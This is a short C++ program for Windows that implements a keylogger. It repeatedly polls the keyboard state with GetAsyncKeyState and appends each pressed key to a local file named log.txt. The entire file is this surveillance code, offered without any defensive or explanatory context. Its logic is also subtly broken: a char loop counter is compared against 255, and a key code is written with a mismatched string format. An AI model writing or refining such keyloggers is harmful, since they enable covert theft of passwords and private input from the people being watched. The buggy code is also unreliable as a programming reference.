#include <iostream>
#include <Windows.h>

using namespace std;

int Save( int _key, const char *file);

int main(){
    char i;
    
    while (true){
        for (i = 8; i<=255 ; i++){
            if (GetAsyncKeyState(i)==-32767){
                Save(i, "log.txt");

            }
        }
    }
    return 0;
}

int Save(int _key, const char *file){
    cout<<_key<<endl;

    FILE *output_file;

    output_file = fopen(file, "a+");

    fprintf(output_file, "%s", &_key);
    fclose(output_file);

    return 0;
}